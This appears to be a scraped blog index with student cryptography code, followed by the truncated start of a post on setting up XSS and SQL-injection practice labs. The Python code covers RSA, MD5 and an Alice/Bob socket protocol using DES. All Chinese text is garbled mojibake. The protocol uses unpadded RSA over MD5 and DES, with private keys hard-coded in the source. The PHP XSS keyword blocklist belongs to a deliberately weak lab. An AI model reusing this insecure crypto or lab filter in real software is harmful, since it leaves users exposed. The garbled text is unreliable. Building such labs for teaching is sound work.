æ•°æ‰é€€å‡º res = &quot;1&quot; for i in range(b-2): res += str(random.randint(0,1)) res += &quot;1&quot; # æœ€åä¸€ä½ä¸º1ä¿è¯ä¸ºå¥‡æ•° res = int(res,2) if miller_rabin(res): return res # ç›´åˆ°è¯¥æ•°é€šè¿‡ç´ æ•°æ£€éªŒæ‰æ¨å‡ºå¾ªç¯ def genE(phi_n): while True: e = genPrime(b=random.randint(3,13)) #éšæœºç”Ÿæˆe if e &lt; 2000 : # eä¸èƒ½å¤ªå° continue if phi_n%e != 0: # ä¿è¯eä¸èƒ½è¢«phiæ•´é™¤ return e def RSAEncode(m, e, n): # åŠ å¯†å…¬å¼ m^e mod n m = int(str2Hex(m), 16) # å°†å­—ç¬¦è½¬æ¢ä¸ºäºŒè¿›åˆ¶ c = fast_mod(m, e, n) return c def RSADecode(c, d, n): # åŠ å¯†å…¬å¼ c^d mod n plaintext = fast_mod(c,d,n) plaintext = str(long_to_bytes(plaintext).decode()) # å°†æ•°å­—è½¬æ¢ä¸ºå­—ç¬¦ return plaintext def main(): # ç”Ÿæˆä¸¤ä¸ªå¤§ç´ æ•°på’Œq print(&quot;Generate p,q and e, please wait... &quot;) p = genPrime() q = genPrime() print (&quot;p = &quot;+str(p)) print (&quot;q = &quot;+str(q)) n = p*q print (&quot;n = &quot;+str(n)) # ç”¨æ¬§æ‹‰å®šç†è®¡ç®— phi_n phi_n = (p-1)*(q-1) # ç”Ÿæˆe e = genE(phi_n) print (&quot;e = &quot;+str(e)) # m = &quot;Hello world!&quot; m = str(input(&#x27;è¯·è¾“å…¥æ˜æ–‡: &#x27;)) # åŠ å¯†ç®—æ³• Cryphtext = RSAEncode(m, e, n) print (&quot;The Ciphertext is: &quot;+str(Cryphtext)) # è§£å¯†ç®—æ³• d = caculateD(e, phi_n) Plaintext = RSADecode(Cryphtext, d, n) print (&quot;The Plaintext is: &quot;+Plaintext) if __name__ == &#x27;__main__&#x27;: main() äº”ã€MD5# -*- coding = utf - 8 -*- #@Time : 2020/12/18 21:50 #@Author : sunzy #@File : MD5.py import math # å®šä¹‰åˆå§‹å‘é‡abcd,å¹¶å°†å…¶è½¬æ¢æˆ2è¿›åˆ¶,ä¸”è¡¥0åˆ°32ä½ # æ ‡å‡†çš„å¹»æ•°ï¼ˆç‰©ç†é¡ºåºï¼‰æ˜¯ï¼ˆA=(01234567)16ï¼ŒB=(89ABCDEF)16ï¼ŒC=(FEDCBA98)16ï¼ŒD=(76543210)16ï¼‰ã€‚å¦‚æœåœ¨ç¨‹åºä¸­å®šä¹‰åº”è¯¥æ˜¯: # ï¼ˆA=0X67452301Lï¼ŒB=0XEFCDAB89Lï¼ŒC=0X98BADCFELï¼ŒD=0X10325476Lï¼‰ ABCD_list = [&#x27;67452301&#x27;,&#x27;efcdab89&#x27;,&#x27;98badcfe&#x27;,&#x27;10325476&#x27;] for i in range(len(ABCD_list)): tmp = bin(int(ABCD_list[i], 16))[2:] if len(tmp) &lt; 32: tmp = (32 - len(tmp)) * &#x27;0&#x27; + tmp ABCD_list[i] = tmp A0,B0,C0,D0 = ABCD_list[0], ABCD_list[1], ABCD_list[2], ABCD_list[3] # ç”Ÿæˆç¬¬1-64ä¸ªå¼å­çš„ç¬¬iä¸ª32æ¯”ç‰¹å¸¸æ•° Ti = [] for i in range(0, 64): result = (int(4294967296 * abs(math.sin(i + 1)))) &amp; 0xffffffff result = bin(result)[2:] if len(result) &lt; 32: result = (32 - len(result)) * &#x27;0&#x27; + result Ti.append(result) # å®ç°x,yçš„é€æ¯”ç‰¹ä¸ def and1(x, y): res = &#x27;&#x27; for i in range(0, len(x)): res += str(int(x[i])&amp;int(y[i])) return res # å®ç°x,yçš„é€æ¯”ç‰¹æˆ– def or1(x, y): res = &#x27;&#x27; for i in range(0, len(x)): res += str(int(x[i])|int(y[i])) return res # å®ç°x,yçš„é€æ¯”ç‰¹å¼‚æˆ– def xor(x, y): res = &#x27;&#x27; for i in range(0, len(x)): res += str(int(x[i])^int(y[i])) return res # å®ç°xçš„é€æ¯”ç‰¹é€»è¾‘å def reverse(x): res = &#x27;&#x27; for i in range(0, len(x)): res += str((int(x[i], 2) + 1) % 2) return res # å®ç°xçš„å¾ªç¯å·¦ç§» def shift(x, i): res = &#x27;&#x27; for t in range(0, len(x) - i): res = res + x[t + i:t + i + 1] # å…ˆä¿å­˜ x[i:] å†ä¿å­˜x[:i] for y in range(0, i): res = res + x[y:y + 1] return res # å®ç°æ•´æ•°æ¨¡2çš„ä¸‰åäºŒæ¬¡æ–¹åŠ æ³• def add(x, y): a = int(x,2) #å…ˆå°†äºŒè¿›åˆ¶è½¬æ¢æˆåè¿›åˆ¶ b = int(y,2) res = (a + b)%(2**32) res = str(bin(res)[2:]) if len(res) != 32: # è¡¥å……åˆ°32ä½ res = (32-len(res))*&#x27;0&#x27;+res return res # å®šä¹‰f,g,h,iå‡½æ•° def ffunc(x, y, z): # ((x&amp;y)|((~x)&amp;z)) t = and1(x, y) t1 = reverse(x) t2 = and1(t1, z) return or1(t, t2) def gfunc(x, y, z): # ((x&amp;z)|(y&amp;(~z))) t = and1(x, z) t1 = reverse(z) t2 = and1(y, t1) return or1(t, t2) def hfunc(x, y, z): # (x^y^z) t1 = xor(x, y) t2 = xor(t1, z) return t2 def ifunc(x, y, z): # (y^(x|(~z))) t = reverse(z) t1 = or1(x, t) return xor(y, t1) def fill(text): text1 = &#x27;&#x27; for i in text: t = str(ord(i)) t = str(bin(int(t, 10))[2:]) if len(t) &lt; 8: # å°†æ¯ä¸ªå­—ç¬¦è½¬æ¢æˆ8ä½äºŒè¿›åˆ¶æ•° for num in range(8 - len(t)): t = &#x27;0&#x27; + t text1 = text1 + t length = len(text1) length1 = 512 - len(text1) - 65 # length1æ˜¯è¦å¡«å……0çš„ä½æ•° text1 = text1 + &#x27;1&#x27; # ç¬¬ä¸€ä½æ·»åŠ  0 text1 = text1 + &#x27;0&#x27;*length1 # å°†å…¶è¡¥å……åˆ° N*512+448 Nå¯ä»¥ä¸º0 text2 = bin(length)[2:] # å°†å­—ç¬¦é•¿åº¦è½¬æ¢æˆäºŒè¿›åˆ¶æ•° if len(text2) &lt; 8: # å¡«å……åé¢64ä½,å…ˆå¡«å……å­—ç¬¦ä¸²çš„é•¿åº¦,å†è¡¥0 text2 = &#x27;0&#x27;*(8 - len(text2)) + text2 length2 = 64 - len(text2) text2 = text2 + &#x27;0&#x27;*length2 # å¡«å……åé¢64ä½,å…ˆå¡«å……å­—ç¬¦ä¸²çš„é•¿åº¦,å†è¡¥0 return text1 + text2 # å°†æœ€åå¾—åˆ°çš„ABCDé€†åºè¾“å‡º æœ€åä¸€æ­¥ä½¿ç”¨ def reverse_order(a): res = a[24:32] + a[16:24] + a[8:16] + a[0:8] return res # è¾“å…¥è¦åŠ å¯†çš„æ˜æ–‡ password = input(&quot;è¯·è¾“å…¥è¦åŠ å¯†çš„ä¿¡æ¯:&quot;) # å¡«å……ç®—æ³• x = fill(password) j = 0 M = [] for i in range(0,len(x),32): # å°†512ä½åˆ†æˆåå…­ç»„ M.append(x[i:i+32]) M[j] = M[j][24:32] + M[j][16:24] + M[j][8:16] + M[j][0:8] j+=1 # md5ç®—æ³•çš„ç¬¬ä¸€æ­¥ A,B,C,D= A0,B0,C0,D0 #ä¸ºç¬¬äº”æ­¥ ç›¸åŠ åŸå§‹çš„A,B,C,Dåšå¤‡ä»½ # md5ç®—æ³•çš„ç¬¬äºŒæ­¥ AA,BB,CC,DD = A,B,C,D # md5ç®—æ³•çš„ç¬¬ä¸‰æ­¥ # ç¬¬ä¸€è½® æ¯è½®A,B,C,Déƒ½å¤„ç†å››æ¬¡ï¼Œå››è½®å°±æ˜¯åå…­æ¬¡ï¼Œä¸€å…±å…­åå››æ¬¡ for i in range(4): # få‡½æ•° A = add(B, shift(add(A, add(add(ffunc(B, C, D), M[4*i]), Ti[4 * i])), 7)) D = add(A, shift(add(D, add(add(ffunc(A, B, C), M[4*i+1]), Ti[4 * i + 1])), 12)) C = add(D, shift(add(C, add(add(ffunc(D, A, B), M[4*i+2]), Ti[4 * i + 2])), 17)) B = add(C, shift(add(B, add(add(ffunc(C, D, A), M[4*i+3]), Ti[4 * i + 3])), 22)) # ç¬¬äºŒè½® k = 1 j = 16 for i in range(4): A = add(B, shift(add(A, add(add(gfunc(B, C, D), M[(k+5*(4*i))%16]), Ti[j + i * 4])), 5)) D = add(A, shift(add(D, add(add(gfunc(A, B, C), M[(k+5*(4*i+1))%16]), Ti[j + i * 4 + 1])), 9)) C = add(D, shift(add(C, add(add(gfunc(D, A, B), M[(k+5*(4*i+2))%16]), Ti[j + i * 4 + 2])), 14)) B = add(C, shift(add(B, add(add(gfunc(C, D, A), M[(k+5*(4*i+3))%16]), Ti[j + i * 4 + 3])), 20)) # ç¬¬ä¸‰è½® k = 5 j = 32 for i in range(4): A = add(B, shift(add(A, add(add(hfunc(B, C, D), M[(k+i*4*3)%16]), Ti[j + i * 4])), 4)) D = add(A, shift(add(D, add(add(hfunc(A, B, C), M[(k+(i*4+1)*3)%16]), Ti[j + i * 4 + 1])), 11)) C = add(D, shift(add(C, add(add(hfunc(D, A, B), M[(k+(i*4+2)*3)%16]), Ti[j + i * 4 + 2])), 16)) B = add(C, shift(add(B, add(add(hfunc(C, D, A), M[(k+(i*4+3)*3)%16]), Ti[j + i * 4 + 3])), 23)) # ç¬¬å››è½® k = 0 j = 48 for i in range(4): A = add(B, shift(add(A, add(add(ifunc(B, C, D), M[(k+(i*4)*7)%16]), Ti[j + i * 4])), 6)) D = add(A, shift(add(D, add(add(ifunc(A, B, C), M[(k+(i*4+1)*7)%16]), Ti[j + i * 4 + 1])), 10)) C = add(D, shift(add(C, add(add(ifunc(D, A, B), M[(k+(i*4+2)*7)%16]), Ti[j + i * 4 + 2])), 15)) B = add(C, shift(add(B, add(add(ifunc(C, D, A), M[(k+(i*4+3)*7)%16]), Ti[j + i * 4 + 3])), 21)) # ç¬¬äº”æ­¥ å°†è®¡ç®—å‡ºçš„A,B,C,Dä¸åˆå§‹çš„ç›¸åŠ ï¼Œå¹¶èµ‹å€¼ A,B,C,D = add(A, AA),add(B, BB),add(C, CC),add(D, DD) # è¾“å‡ºå¾—åˆ°çš„å¯†æ–‡ ciphertext = reverse_order(A) + reverse_order(B) + reverse_order(C) + reverse_order(D) cipher = ciphertext ciphertext = str(hex(int(ciphertext, 2))[2:]) # å°†äºŒè¿›åˆ¶æ•°è½¬æ¢ä¸ºåå…­è¿›åˆ¶æ•° ciphertext = &#x27;0&#x27;*(32-len(ciphertext))+ciphertext # ä¸ºäº†é¿å…ç¬¬ä¸€ä¸ªæ•°å­—ä¸ºé›¶æ—¶æ— æ³•æ˜¾ç¤ºå‡ºæ¥ print(&quot;hashå€¼(å°å†™):&quot;,ciphertext) print(&quot;hashå€¼(å¤§å†™):&quot;,ciphertext.upper()) å…­ã€ç»¼åˆå®éªŒ6.1 å®éªŒå†…å®¹ç°åœ¨ï¼ŒAliceæƒ³é€šè¿‡å…¬å…±ä¿¡é“ç»™Bobä¼ è¾“ä¸€ä»½ç§˜å¯†æ–‡ä»¶ï¼ˆæ–‡ä»¶éå¸¸å¤§ï¼‰ã€‚åˆçŸ¥é“ï¼Œå¾ˆå¤šäººå’Œæœºæ„æƒ³å¾—åˆ°è¿™ä»½æ–‡ä»¶ã€‚éœ€è¦è®¾è®¡ä¸€ä¸ªé€šä¿¡æ¨¡å‹ï¼Œæ¥ä¿è¯æ–‡ä»¶çš„æœºå¯†æ€§å’Œå®Œæ•´æ€§ã€‚ ç°åœ¨å¾ˆå¤šäººæƒ³è¦å¾—åˆ°è¿™ä»½æ–‡ä»¶ï¼Œé‚£ä¹ˆï¼Œå¯èƒ½ä¼šæœ‰å¾ˆå¤šäººåœ¨å‡å†’Bobçš„èº«ä»½ï¼Œæ¥è¯·æ±‚å¾—åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œéœ€è¦å¯¹Bobèº«ä»½è¿›è¡ŒéªŒè¯ï¼›ä¹Ÿæœ‰å¯èƒ½æ˜¯å¾ˆå¤šäººå¾—ä¸åˆ°æ–‡ä»¶ï¼Œå°±å‡å†’Aliceçš„èº«ä»½ï¼Œæƒ³è¦ç»™Bobå‘é€æ–‡ä»¶ï¼Œå¦‚æœæœ‰äººå‘é€æ¶æ„æ–‡ä»¶ç»™Bobï¼ŒBobå‘ç°ä¸æ˜¯æƒ³è¦çš„æ–‡ä»¶ï¼Œä½†è¿™ä¸ªæ–‡ä»¶ç»™Bobç”µè„‘å®‰è£…äº†åé—¨ï¼Œç­‰ä»–æ¥å—äº†æ­£ç¡®çš„æ–‡ä»¶ï¼Œå°±å­˜åœ¨æ³„æ¼çš„é£é™©ï¼Œæ‰€ä»¥éœ€è¦å¯¹Aliceèº«ä»½è¿›è¡ŒéªŒè¯ã€‚ 6.2 åˆ†æå®éªŒéœ€æ±‚ç°åœ¨å¾ˆå¤šäººæƒ³è¦å¾—åˆ°è¿™ä»½æ–‡ä»¶ï¼Œé‚£ä¹ˆï¼Œå¯èƒ½ä¼šæœ‰å¾ˆå¤šäººåœ¨å‡å†’Bobçš„èº«ä»½ï¼Œæ¥è¯·æ±‚å¾—åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œéœ€è¦å¯¹Bobèº«ä»½è¿›è¡ŒéªŒè¯ï¼›ä¹Ÿæœ‰å¯èƒ½æ˜¯å¾ˆå¤šäººå¾—ä¸åˆ°æ–‡ä»¶ï¼Œå°±å‡å†’Aliceçš„èº«ä»½ï¼Œæƒ³è¦ç»™Bobå‘é€æ–‡ä»¶ï¼Œå¦‚æœæœ‰äººå‘é€æ¶æ„æ–‡ä»¶ç»™Bobï¼ŒBobå‘ç°ä¸æ˜¯æƒ³è¦çš„æ–‡ä»¶ï¼Œä½†è¿™ä¸ªæ–‡ä»¶ç»™Bobç”µè„‘å®‰è£…äº†åé—¨ï¼Œç­‰ä»–æ¥å—äº†æ­£ç¡®çš„æ–‡ä»¶ï¼Œå°±å­˜åœ¨æ³„æ¼çš„é£é™©ï¼Œæ‰€ä»¥éœ€è¦å¯¹Aliceèº«ä»½è¿›è¡ŒéªŒè¯ã€‚ æ ¹æ®åˆ†æï¼Œæ‰€å¾—ç»“æœå¦‚ä¸‹: ä¼ è¾“çš„æ˜¯ç§˜å¯†æ–‡ä»¶ï¼Œæ‰€ä»¥å¯èƒ½å­˜åœ¨äººå†’å……bobæ¥æ”¶æ–‡ä»¶ï¼Œæ‰€ä»¥Aliceåœ¨ä¸ä¼ è¾“æ–‡ä»¶ä¹‹å‰éœ€è¦å¯¹bobçš„èº«ä»½è¿›è¡Œè®¤è¯ï¼Œè€Œä¸”bobé˜²æ­¢è¢«æ¬ºéª—ä¹Ÿéœ€è¦å¯¹Aliceçš„èº«ä»½è¿›è¡Œè®¤è¯ï¼Œè¿™é‡Œå¯ä»¥é‡‡ç”¨ç¬¬äºŒç±»ç­¾åç®—æ³•ã€‚ åœ¨ç¡®è®¤å½¼æ­¤èº«ä»½åéœ€è¦å°†æ–‡ä»¶é€šè¿‡å…¬å…±ä¿¡é“ä¼ è¾“ï¼Œä½†æ˜¯å¯èƒ½å­˜åœ¨æ”»å‡»äººåŠ«æŒï¼Œæ‰€ä»¥éœ€è¦å¯¹æ–‡ä»¶å†…å®¹åŠ å¯†ï¼Œè€Œæ–‡ä»¶å†…å®¹å¾ˆå¤§ï¼Œè€ƒè™‘åˆ°åŠ å¯†é€Ÿåº¦é—®é¢˜ï¼Œæ‰€ä»¥é‡‡ç”¨å¯¹ç§°åŠ å¯†ç®—æ³•ã€‚ é‡‡ç”¨å¯¹ç§°åŠ å¯†ç®—æ³•éœ€è¦å¯†é’¥ï¼Œè€Œè¿™é‡Œä½¿ç”¨éšæœºç”Ÿæˆçš„å¯†é’¥ã€‚å¹¶ä¸”è¿™ä¸ªå¯†é’¥ä¹Ÿéœ€è¦ä¼ ç»™bobç”¨äºè§£å¯†ï¼Œä½†æ˜¯å…¬å…±ä¿¡é“ä¸å®‰å…¨ï¼Œæ‰€ä»¥ä¹Ÿéœ€è¦å¯¹è¯¥å¯†é’¥è¿›è¡ŒåŠ å¯†ã€‚è€ƒè™‘åˆ°å¯†é’¥é•¿åº¦ä¸æ˜¯å¾ˆå¤§ï¼Œæ‰€ä»¥å¯ä»¥é‡‡ç”¨å…¬é’¥åŠ å¯†ç®—æ³•ï¼Œè€Œä¸”å…¬é’¥åŠ å¯†ç®—æ³•å¯ä»¥è§£å†³ä¼ è¾“æ­¤æ¬¡åŠ å¯†ä½¿ç”¨çš„å¯†é’¥ï¼Œæé«˜å®‰å…¨æ€§å’Œæ•ˆç‡ã€‚ Bobæ”¶åˆ°å¯†æ–‡å’ŒåŠ å¯†åçš„å¯†é’¥ï¼Œä½¿ç”¨è‡ªå·±çš„ç§é’¥è§£å¯†å‡ºå¯¹ç§°åŠ å¯†ç®—æ³•ä½¿ç”¨çš„å¯†é’¥ï¼Œç„¶åä½¿ç”¨å¯†é’¥è§£å¯†å¯†æ–‡åå‘Aliceå‘é€ç¡®è®¤æ¶ˆæ¯ï¼Œç¡®ä¿bobæ”¶åˆ°æ¶ˆæ¯ã€‚ ç¡®è®¤æ¶ˆæ¯ä¹Ÿè¦ä½¿ç”¨åˆ°ç¬¬ä¸€æ­¥ä½¿ç”¨çš„ç­¾åç®—æ³•ã€‚ 6.3 ç¨‹åºæµç¨‹å›¾ 6.4 å®Œæ•´ä»£ç Alice # -*- coding = utf - 8 -*- #@Time : 2021/1/3 23:17 #@Author : sunzy #@File : Alice.py from RSA import * from DES import * from MD5 import * from file_decode import * import socket n_bob = 81836285346168841919828227774710209132464519960137459236348092425786962849543 n = 44531776921047477359676235110843825307036514195195627878765712056028758572817 d = 34159352569920789505556306994405309761109146525598570740717995833480670158209 e = 65537 name = &quot;This is alice.&quot; client = socket.socket() client.connect((&#x27;127.0.0.1&#x27;,8888)) # æœ¬æœºåœ°å€å’Œç«¯å£ data = client.recv(1024) print(str(data, &quot;utf-8&quot;),end=&quot;&quot;) client.send(b&#x27;1&#x27;) print(&quot;ç­‰å¾…bobéªŒè¯è‡ªèº«èº«ä»½...&quot;) # aliceé€å‡ºè‡ªå·±çš„èº«ä»½ä¿¡æ¯å’Œç­¾åå€¼ client.send(bytes(name,&#x27;utf-8&#x27;)) # aliceå‘é€èº«ä»½æ˜æ–‡ä¿¡æ¯ client.recv(1024).decode() hash_name = md5(name) crpto_name = str(RSAEncode(hash_name, d, n)) # å‘é€å¯¹hashå€¼åŠ å¯†åçš„å€¼ crpto_name = bytes(crpto_name,&#x27;utf-8&#x27;) client.send(crpto_name) print(client.recv(1024).decode()) # æ¥æ”¶èº«ä»½è®¤è¯çš„ç»“æœ #æ¥æ”¶bobèº«ä»½hashå¹¶éªŒè¯ print(&quot;éªŒè¯bobèº«ä»½...&quot;,end=&quot;&quot;) a=input() bob_name = client.recv(512).decode() # bobå‘é€è¿‡æ¥çš„èº«ä»½æ˜æ–‡ä¿¡æ¯ client.send(b&#x27;1&#x27;) hash_name = client.recv(512).decode() # bobä½¿ç”¨è‡ªå·±çš„ç§é’¥åŠ å¯†èº«ä»½æ˜æ–‡ä¿¡æ¯hashå€¼åçš„å€¼ plain_text = RSADecode(int(hash_name),e,n_bob) # ä½¿ç”¨bobçš„å…¬é’¥è§£å¯†ä¸Šä¸€æ­¥çš„å€¼ client.send(b&#x27;1&#x27;) if plain_text == md5(bob_name): # éªŒè¯æ˜¯ä¸æ˜¯bob print(bob_name) print(&quot;éªŒè¯é€šè¿‡!&quot;) else: exit(&quot;éªŒè¯é”™è¯¯!&quot;) while 1: a = input() bin_key = gen_key() # éšæœºç”Ÿæˆ64ä½çš„ DESåŠ å¯†æ˜æ–‡ä½¿ç”¨çš„å¯†é’¥ int_key = int(bin_key,2) # å°†å…¶è½¬æ¢ä¸ºåè¿›åˆ¶æ•°ï¼Œä¾¿äºåé¢ä½¿ç”¨RSAç®—æ³•åŠ å¯† print(&quot;éšæœºäº§ç”Ÿå¯¹ç§°å¯†é’¥:&quot;,int_key) # æ¯æ¬¡ä¼ è¾“éšæœºäº§ç”Ÿä¸€ä¸ªå¯†é’¥æ›´åŠ å®‰å…¨ plain = read_file() # è¯»å–æ–‡ä»¶å†…å®¹ bin_cipher = DES_encode(plain, bin_key) # ä½¿ç”¨DESç®—æ³•åŠ å¯†å†…å®¹ a = input() int_key = fast_mod(int_key,e,n_bob) # åŠ å¯†DESçš„å¯†é’¥ eæ˜¯bobçš„å…¬é’¥ print(&quot;åŠ å¯†å¯¹ç§°å¯†é’¥&quot;) print(&quot;ä¼ è¾“å¯†é’¥...&quot;) # ä¼ è¾“åŠ å¯†åDESå¯†é’¥ client.sendall(bytes(str(int_key),&quot;utf-8&quot;)) client.recv(512) length = str(len(bin_cipher)) # ä¼ è¾“å‘é€å†…å®¹çš„é•¿åº¦ length = bytes(length,&quot;utf-8&quot;) # æ–¹ä¾¿å…¶æ¥æ”¶ client.send(length) print(&quot;ä¼ è¾“å¯†æ–‡...&quot;) client.sendall(bytes(str(bin_cipher),&quot;utf-8&quot;)) #å‘é€å¯†æ–‡ message = client.recv(512).decode() client.send(b&#x27;1&#x27;) crypt_message = client.recv(512).decode() hash_message = RSADecode(int(crypt_message),e,n_bob) if hash_message == md5(message): print(message) print(&quot;æ–‡ä»¶ä¼ è¾“ç»“æŸï¼&quot;) break client.close() Bob # -*- coding = utf - 8 -*- #@Time : 2021/1/3 23:17 #@Author : sunzy #@File : bob.py import socket import libnum from RSA import * from DES import * from MD5 import * name = &quot;This is bob.&quot; n = 81836285346168841919828227774710209132464519960137459236348092425786962849543 n_alice = 44531776921047477359676235110843825307036514195195627878765712056028758572817 d = 39540198292360595989919600111176873707392294831248672388670326288876701993673 e = 65537 # e_alice = 2081 server = socket.socket() #åˆ›å»ºå¯¹è±¡ server.bind((&quot;localhost&quot;,8888))#ç»‘å®š ipå’Œç«¯å£ server.listen() #ç›‘å¬ #ç­‰å¾…è¿æ¥ print(&#x27;Waiting connection...&#x27;) #æ¥å—è¯·æ±‚ï¼Œè¿”å›å¥—æ¥å­—å¯¹è±¡å’ŒIP+ç«¯å£å· con,addr = server.accept() con.send(bytes(&quot;Welcome connect!\\nå¼€å§‹åŠ å¯†ä¼ è¾“:\\n&quot;,&quot;utf-8&quot;)) con.recv(1024) # éªŒè¯aliceèº«ä»½ print(&quot;éªŒè¯aliceèº«ä»½...&quot;) a = input() alice_name = con.recv(512).decode() # alice çš„æ˜æ–‡ä¿¡æ¯ con.send(b&#x27;1&#x27;) hash_name = con.recv(512).decode() # alice ç”¨ç§é’¥åŠ å¯†æ˜æ–‡çš„hashå€¼ plain_text = RSADecode(int(hash_name),e,n_alice) # ç”¨alice çš„å…¬é’¥è§£å¯†å‡ºhashå€¼ if plain_text == md5(alice_name): # åˆ¤æ–­ä¸Šä¸€æ­¥çš„å€¼ä¸md5å‡½æ•°åŠ å¯†æ˜¯å¦ç›¸åŒ print(alice_name) # å¦‚æœäºŒè€…ç›¸åŒåˆ™å¯ä»¥ä¿è¯å¯¹æ–¹æ˜¯alice,è¿™é‡Œçš„å®‰å…¨æ€§æ˜¯ç”±å…¬é’¥ç®—æ³•å’Œhashå‡½æ•°ä¿è¯ print(&quot;éªŒè¯é€šè¿‡ï¼&quot;) # å› ä¸ºåªæœ‰aliceæœ‰è‡ªå·±çš„ç§é’¥ï¼Œhashå‡½æ•°çš„å­˜åœ¨é˜²æ­¢ä¼ªé€ æ˜æ–‡æ”»å‡» con.send(bytes(&quot;æ‚¨é€šè¿‡äº†éªŒè¯!&quot;,&quot;utf-8&quot;)) else: exit(&quot;è¿™ä¸æ˜¯alice,éªŒè¯é”™è¯¯ï¼&quot;) #é€å‡ºè‡ªå·±çš„èº«ä»½ä¿¡æ¯å’Œç­¾åå€¼ print(&quot;ç­‰å¾…aliceéªŒè¯è‡ªèº«èº«ä»½...&quot;) con.send(bytes(name,&#x27;utf-8&#x27;)) # å‘aliceå‘é€èº«ä»½ä¿¡æ¯çš„æ˜æ–‡ con.recv(1024).decode() hash_name = md5(name) # æ˜æ–‡ä¿¡æ¯çš„hashå€¼ crpto_name = str(RSAEncode(hash_name, d, n)) # ä½¿ç”¨è‡ªå·±çš„ç§é’¥åŠ å¯†ä¸Šä¸€æ­¥çš„hashå€¼ crpto_name = bytes(crpto_name,&#x27;utf-8&#x27;) # å‘é€ç»™alice con.send(crpto_name) con.recv(1024) while 1: data = con.recv(1024) # æ¥æ”¶aliceå‘é€çš„ä½¿ç”¨å…¬é’¥ç®—æ³•åŠ å¯†åçš„DESçš„å¯†é’¥ data = data.decode() int_key = int(data) print(&quot;è¢«åŠ å¯†åçš„å¯†é’¥:&quot;,int_key) int_key = fast_mod(int_key, d, n) # ä½¿ç”¨ç§é’¥dè§£å¯†å‡ºDESå¯†é’¥ print(&quot;è§£å¯†åçš„å¯†é’¥&quot;, int_key) print(&quot;----&quot;*10) # æ¥æ”¶å¯†æ–‡çš„é•¿åº¦ï¼ˆä¸ºäº†æ–¹ä¾¿å­˜å‚¨ï¼‰ con.send(b&#x27;1&#x27;) length = con.recv(1024) length = int(length.decode()) buff = [] size = 0 while size &lt; length: # å¼€å§‹æ¥å—å¯†æ–‡ dat = con.recv(1024) size += len(dat.decode()) buff.append(dat) data = b&#x27;&#x27;.join(buff) bin_cipher = data.decode() cipher = bin_to_str(bin_cipher) bin_key = bin(int_key)[2:] # å°†å¯†é’¥è½¬æ¢æˆäºŒè¿›åˆ¶æ•° print(&quot;è§£å¯†ä¼ è¾“å†…å®¹:&quot;) print(libnum.b2s(DES_decode(cipher, bin_key))) #æ‰“å°å‡ºè§£å¯†åçš„æ˜æ–‡ message = &quot;Bob received the file successfully!&quot; con.send(bytes(message,&#x27;utf-8&#x27;)) con.recv(1024).decode() hash_message = md5(message) crypt_message = str(RSAEncode(hash_message,d,n)) con.send(bytes(crypt_message,&#x27;utf-8&#x27;)) break server.close() file_decode # -*- coding = utf - 8 -*- #@Time : 2021/1/3 23:17 #@Author : sunzy #@File : file_decode.py import random import socket import re from RSA import * from DES import * from MD5 import * def gen_key(): # ç”Ÿæˆ64ä½çš„å¯¹ç§°åŠ å¯†çš„å¯†é’¥ list = [] for i in range(64): c = random.choice([&#x27;0&#x27;, &#x27;1&#x27;]) list.append(c) res = &quot;&quot;.join(list) return res def read_file(): try: f = open(&#x27;text.txt&#x27;,&#x27;r&#x27;, encoding = &#x27;utf-8&#x27;) text = f.read() f.close() print(&quot;è¯»å–æˆåŠŸ!&quot;) return text except IOError: print(&quot;è¯»å–é”™è¯¯!&quot;) def bin_to_str(bin_str) : # 8ä½äºŒè¿›åˆ¶è½¬å­—ç¬¦ï¼Œç”¨äºbobæ”¶åˆ°å¯†åä½¿ç”¨ res = &quot;&quot; tmp = re.findall(r&#x27;.&#123;8&#125;&#x27;,bin_str) for i in tmp : res += chr(int(i,2)) return res","tags":[{"name":"å¤å…¸å¯†ç ","slug":"å¤å…¸å¯†ç ","permalink":"https://sunzhengyu99.github.io/tags/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/"},{"name":"DES","slug":"DES","permalink":"https://sunzhengyu99.github.io/tags/DES/"},{"name":"RSA","slug":"RSA","permalink":"https://sunzhengyu99.github.io/tags/RSA/"},{"name":"MD5","slug":"MD5","permalink":"https://sunzhengyu99.github.io/tags/MD5/"}]},{"title":"xsså’Œsqlæ³¨å…¥ç®€å•ç¯å¢ƒçš„æ­å»º","date":"2020-11-15T08:14:50.000Z","path":"2020/11/15/xss-sql/","text":"xsså’Œsqlæ³¨å…¥ç®€å•ç¯å¢ƒçš„æ­å»ºä»¥ä¸‹ç¯å¢ƒéƒ½æ˜¯åŸºäºPHP studyæ­å»ºçš„ï¼Œç‰ˆæœ¬ä¸º php 5.5.38+Apache å‚è€ƒäº†dvwaçš„æ¼æ´æºç ä¸æ”»å‡»æ–¹å¼ã€‚ xssæ¼æ´çš„æ­å»º1.ç½‘é¡µæºç &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt; &lt;title&gt;xss&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;center&gt; &lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt; &lt;h6&gt;please input your name!&lt;&#x2F;h6&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; value&#x3D;&quot;&quot; &#x2F;&gt;&lt;br &#x2F;&gt; &lt;input type&#x3D;&#39;submit&#39; value&#x3D;&quot;submit&quot; &#x2F;&gt; &lt;&#x2F;form&gt; &lt;?php function SafeFilter (&amp;$arr) &#123; $ra&#x3D;Array(&#39;&#x2F;([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])&#x2F;&#39;,&#39;&#x2F;script&#x2F;&#39;,&#39;&#x2F;javascript&#x2F;&#39;,&#39;&#x2F;vbscript&#x2F;&#39;,&#39;&#x2F;expression&#x2F;&#39;,&#39;&#x2F;applet&#x2F;&#39; ,&#39;&#x2F;meta&#x2F;&#39;,&#39;&#x2F;xml&#x2F;&#39;,&#39;&#x2F;blink&#x2F;&#39;,&#39;&#x2F;link&#x2F;&#39;,&#39;&#x2F;style&#x2F;&#39;,&#39;&#x2F;embed&#x2F;&#39;,&#39;&#x2F;object&#x2F;&#39;,&#39;&#x2F;frame&#x2F;&#39;,&#39;&#x2F;layer&#x2F;&#39;,&#39;&#x2F;title&#x2F;&#39;,&#39;&#x2F;bgsound&#x2F;&#39; 